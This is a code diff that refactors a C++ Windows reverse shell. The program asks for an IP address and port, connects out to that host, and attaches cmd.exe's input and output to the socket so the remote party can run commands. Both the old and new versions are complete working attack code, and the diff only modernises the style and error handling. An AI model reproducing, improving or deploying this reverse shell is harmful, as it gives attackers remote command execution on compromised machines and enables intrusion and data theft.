@@ -1,47 +1,41 @@
-/********************
-    INITIALIZATION
-*********************/
-
 #include <iostream>
+#include <string>
 #include <winsock2.h>
-#include <stdio.h>
 #include <ws2tcpip.h>
+#include <process.h>
+#include <stdexcept>
+
 #pragma comment(lib, "Ws2_32.lib")
+
+const int BUFFER_SIZE = 512;
 
 int main()
 {
-    WSADATA wsa;
-    SOCKET shell;
-    int connection;
-    char* ip_addr = new char[16];
-    char* port_str = new char[6];
-    char RecvServer[512];
-    int port;
-
-    // Prompt user to enter IP address and port number
-    printf("Enter IP address: ");
-    scanf("%s", ip_addr);
-    printf("Enter port number: ");
-    scanf("%s", port_str);
-
-    port = atoi(port_str);
-
-    // Initialize Winsock
-    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
+    WSADATA wsaData;
+    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
+    if (result != 0)
     {
-        printf("WSAStartup failed. Error Code : %d", WSAGetLastError());
-        delete[] ip_addr;
-        delete[] port_str;
+        std::cerr << "WSAStartup failed: " << result << std::endl;
         return 1;
     }
 
+    // Prompt user to enter IP address and port number
+    std::string ip_addr;
+    std::cout << "Enter IP address: ";
+    std::cin >> ip_addr;
+
+    std::string port_str;
+    std::cout << "Enter port number: ";
+    std::cin >> port_str;
+
+    // Convert port string to integer
+    int port = std::stoi(port_str);
+
     // Create a TCP socket
-    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+    SOCKET shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
     if (shell == INVALID_SOCKET)
     {
-        printf("Socket creation failed. Error Code : %d", WSAGetLastError());
-        delete[] ip_addr;
-        delete[] port_str;
+        std::cerr << "Socket creation failed: " << WSAGetLastError() << std::endl;
         return 1;
     }
 
@@ -49,56 +43,48 @@ int main()
     sockaddr_in shell_addr;
     shell_addr.sin_family = AF_INET;
     shell_addr.sin_port = htons(port);
-    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);
-
-    /*********************
-        CONNECTION
-    *********************/
+    InetPton(AF_INET, ip_addr.c_str(), &shell_addr.sin_addr);
 
     // Connect to remote server
-    connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
-    if (connection == SOCKET_ERROR)
+    if (connect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr)) == SOCKET_ERROR)
     {
-        printf("Connection to the target server failed. Error Code : %d", WSAGetLastError());
-        delete[] ip_addr;
-        delete[] port_str;
+        std::cerr << "Connection to the target server failed: " << WSAGetLastError() << std::endl;
         return 1;
     }
 
     // Receive server response
-    recv(shell, RecvServer, sizeof(RecvServer), 0);
-
-
-    /*********************
-        SHELL EXECUTION
-    *********************/
-
-    // Execute shell
-    STARTUPINFO si;
-    PROCESS_INFORMATION pi;
-    ZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-    si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
-    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)shell;
-
-    // Spawn cmd window
-    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, true, 0, NULL, NULL, &si, &pi))
+    char recv_buffer[BUFFER_SIZE] = {0};
+    int bytes_received = recv(shell, recv_buffer, BUFFER_SIZE - 1, 0);
+    if (bytes_received == SOCKET_ERROR)
     {
-        printf("Failed to create process. Error Code : %d", GetLastError());
-        delete[] ip_addr;
-        delete[] port_str;
+        std::cerr << "Error receiving data: " << WSAGetLastError() << std::endl;
         return 1;
     }
 
-    // Wait for shell process to terminate
+    // Start cmd.exe process and redirect input and output to the socket
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    ZeroMemory(&pi, sizeof(pi));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)shell;
+    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
+    {
+        std::cerr << "Failed to create process: " << GetLastError() << std::endl;
+        return 1;
+    }
+
+    // Wait for cmd.exe process to terminate
     WaitForSingleObject(pi.hProcess, INFINITE);
 
     // Close process and thread handles
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
-    memset(RecvServer, 0, sizeof(RecvServer));
 
-    delete[] ip_addr;
-    delete[] port_str;
+    // Clean up
+    closesocket(shell);
+    WSACleanup();
+
     return 0;
 }
